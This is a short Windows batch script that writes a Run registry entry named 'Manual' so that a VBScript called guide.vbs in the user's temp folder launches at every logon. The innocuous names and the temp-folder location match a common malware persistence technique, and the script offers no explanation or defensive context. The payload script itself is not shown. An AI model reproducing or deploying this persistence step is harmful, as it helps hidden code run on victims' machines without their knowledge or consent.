@echo off
setlocal

set "tempPath=%TEMP%"

set "programPath=%tempPath%\guide.vbs"

set "regKeyName=Manual"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%regKeyName%" /d "\"%programPath%\"" /f

endlocal